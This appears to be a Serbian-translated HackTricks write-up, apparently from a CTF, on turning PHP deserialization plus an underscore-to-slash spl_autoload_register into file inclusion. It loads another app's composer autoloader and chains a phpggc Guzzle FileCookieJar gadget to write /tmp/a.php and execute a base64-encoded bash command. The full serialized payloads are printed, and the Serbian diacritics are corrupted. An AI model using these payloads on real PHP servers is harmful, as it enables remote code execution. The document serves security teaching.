# PHP - Deserializacija + Autoload Klase

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

Prvo, trebate proveriti 코ta su [**Autoloading Klase**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserializacija + spl\_autoload\_register + LFI/Gadget

Nalazimo se u situaciji gde smo prona코li **PHP deserializaciju u web aplikaciji** bez **ikakvih** biblioteka ranjivih na gadgete unutar **`phpggc`**. Me캠utim, u istom kontejneru postojala je **druga composer web aplikacija sa ranjivim bibliotekama**. Stoga, cilj je bio **u캜itati composer loader druge web aplikacije** i iskoristiti ga da **u캜ita gadget koji 캖e iskoristiti tu biblioteku sa gadgetom** iz web aplikacije ranjive na deserializaciju.

Koraci:

* Prona코li ste **deserializaciju** i **nema gadgeta** u trenutnom kodu aplikacije
* Mo쬰te iskoristiti funkciju **`spl_autoload_register`** kao 코to je slede캖a da **u캜itate bilo koji lokalni fajl sa `.php` ekstenzijom**
* Za to koristite deserializaciju gde 캖e ime klase biti unutar **`$name`**. **Ne mo쬰te koristiti "/" ili "."** u imenu klase u serijalizovanom objektu, ali **kod** **menja** **donje crte** ("\_") **u kose crte** ("/"). Tako 캖e ime klase kao 코to je `tmp_passwd` biti transformisano u `/tmp/passwd.php` i kod 캖e poku코ati da ga u캜ita.\
Primer **gadgeta** bi bio: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Ako imate **upload fajlova** i mo쬰te da upload-ujete fajl sa **`.php` ekstenzijom**, mogli biste **da zloupotrebite ovu funkcionalnost direktno** i dobijete ve캖 RCE.
{% endhint %}

U mom slu캜aju, nisam imao ni코ta sli캜no, ali je unutar **iste kontejnere** bila jo코 jedna composer web stranica sa **bibliotekom koja je ranjiva na `phpggc` gadget**.

* Da biste u캜itali ovu drugu biblioteku, prvo morate da **u캜itate composer loader te druge web aplikacije** (jer loader trenutne aplikacije ne캖e imati pristup bibliotekama druge.) **Poznavaju캖i putanju aplikacije**, to mo쬰te lako posti캖i sa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (U mom slu캜aju, composer loader je bio u `/www/frontend/vendor/autoload.php`)
* Sada mo쬰te **u캜itati** loader **druge aplikacije**, tako da je vreme da **`generi코ete phpgcc`** **payload** koji 캖ete koristiti. U mom slu캜aju, koristio sam **`Guzzle/FW1`**, 코to mi je omogu캖ilo da **pi코em bilo koji fajl unutar fajl sistema**.
* NAPOMENA: **Generisani gadget nije radio**, da bi radio, **izmenio** sam taj payload **`chain.php`** od phpggc i postavio **sve atribute** klasa **sa privatnih na javne**. Ako ne, nakon deserializacije stringa, atributi kreiranih objekata nisu imali nikakve vrednosti.
* Sada imamo na캜in da **u캜itamo loader druge aplikacije** i imamo **phpggc payload koji radi**, ali moramo **to uraditi u ISTOM ZAHTEVU da bi loader bio u캜itan kada se gadget koristi**. Za to, poslao sam serijalizovani niz sa oba objekta kao:
* Mo쬰te videti **prvo kako se loader u캜itava, a zatim payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Sada mo쬰mo **da kreiramo i pi코emo datoteku**, me캠utim, korisnik **nije mogao da pi코e u bilo koju fasciklu unutar web servera**. Dakle, kao 코to mo쬰te videti u payload-u, PHP poziva **`system`** sa nekim **base64** koji je kreiran u **`/tmp/a.php`**. Zatim, mo쬰mo **ponovo iskoristiti prvi tip payload-a** koji smo koristili kao LFI da u캜itamo composer loader druge web aplikacije **da u캜itamo generisanu `/tmp/a.php`** datoteku. Samo ga dodajte u gadget za deserializaciju:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Sa쬰tak napada**

* **U캜itaj composer autoload** druge web aplikacije u istom kontejneru
* **U캜itaj phpggc gadget** da bi iskoristio biblioteku iz druge web aplikacije (prva web aplikacija ranjiva na deserializaciju nije imala nijedan gadget u svojim bibliotekama)
* Gadget 캖e **napraviti datoteku sa PHP payload-om** u /tmp/a.php sa malicioznim komandama (korisnik web aplikacije ne mo쬰 da pi코e u bilo koju fasciklu bilo koje web aplikacije)
* Poslednji deo na코eg payload-a 캖e koristiti **u캜itavanje generisane php datoteke** koja 캖e izvr코iti komande

Trebao sam da **pozovem ovu deserializaciju dva puta**. U mom testiranju, prvi put je datoteka `/tmp/a.php` kreirana, ali nije u캜itana, a drugi put je ispravno u캜itana.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
